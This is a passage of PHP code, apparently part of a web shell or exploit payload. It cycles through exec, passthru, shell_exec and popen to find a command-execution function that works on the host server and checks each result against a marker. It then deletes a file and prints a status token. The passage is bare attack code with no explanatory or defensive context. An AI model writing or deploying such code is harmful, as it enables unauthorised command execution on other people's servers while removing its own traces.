if(!$r)$o=fn_exec($i2);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_passthru($i1);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_passthru($i2);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_shellexec($i1);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_shellexec($i2);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_popen($i1);if(preg_match("/$e/",$o))$r=1;
if(!$r)$o=fn_popen($i2);if(preg_match("/$e/",$o))$r=1;
if($r){@unlink($t);echo "$g=$e=";exit;}
@unlink($t);
echo "$b=run=";exit;
}
main();